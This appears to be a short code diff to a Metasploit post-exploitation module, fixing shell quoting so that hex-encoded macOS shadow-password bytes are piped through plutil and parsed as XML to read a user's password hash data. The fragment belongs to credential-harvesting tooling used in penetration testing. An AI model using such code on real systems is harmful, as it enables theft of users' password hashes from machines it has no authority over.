@@ -59,7 +59,7 @@ class Metasploit3 < Msf::Post
         plist_bytes = shadow_bytes.split('').each_slice(2).map{|s| "\\x#{s[0]}#{s[1]}"}.join
         
         # encode the bytes as \x hex string, print using bash's echo, and pass to plutil
-        shadow_plist = cmd_exec("/bin/bash -c 'echo -ne \"#{plist_bytes}\"' | plutil -convert xml1 - -o -")
+        shadow_plist = cmd_exec("/bin/bash -c 'echo -ne \"#{plist_bytes}\" | plutil -convert xml1 - -o -'")
         
         # read the plaintext xml
         shadow_xml = REXML::Document.new(shadow_plist)
